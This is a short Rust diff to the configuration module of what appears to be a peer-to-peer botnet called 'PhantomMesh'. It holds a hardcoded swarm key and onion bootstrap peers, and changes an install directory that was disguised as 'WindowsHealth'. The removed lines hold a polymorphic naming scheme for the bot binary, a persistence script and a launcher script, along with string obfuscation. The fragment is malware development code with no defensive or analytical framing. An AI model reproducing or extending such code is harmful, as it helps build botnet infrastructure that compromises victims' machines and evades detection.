@@ -1,11 +1,4 @@
-use std::sync::Mutex;
-use crate::security::polymorph::MorphConfig;
-use crate::helpers::paths::get_appdata_dir;
-use once_cell::sync::Lazy;
-use obfstr::obfstr;
-
-pub const CONFIG_FILENAME: &str = "sys_config.dat";
-pub const INSTALL_DIR_NAME: &str = "WindowsHealth"; 
+pub const INSTALL_DIR_NAME: &str = ".phantom_node";
 
 // Bootstrap Peers
 pub const BOOTSTRAP_PEERS: [&str; 3] = [
@@ -16,21 +9,6 @@ pub const BOOTSTRAP_PEERS: [&str; 3] = [
 
 // Legacy alias for compatibility
 pub const BOOTSTRAP_ONIONS: [&str; 3] = BOOTSTRAP_PEERS;
-
-// Dynamic Runtime Configuration
-pub static RUNTIME_CONFIG: Lazy<Mutex<MorphConfig>> = Lazy::new(|| {
-    Mutex::new(MorphConfig::generate())
-});
-
-pub fn get_bot_binary_name() -> String {
-    RUNTIME_CONFIG.lock().unwrap().bot_binary.clone()
-}
-pub fn get_persistence_script_name() -> String {
-    RUNTIME_CONFIG.lock().unwrap().persistence_script.clone()
-}
-pub fn get_launcher_script_name() -> String {
-    RUNTIME_CONFIG.lock().unwrap().launcher_script.clone()
-}
 
 // Pre-Shared Swarm Key (32 bytes)
 pub const SWARM_KEY: &[u8; 32] = b"PhantomMeshV3_SecretSwarmKey_32b";
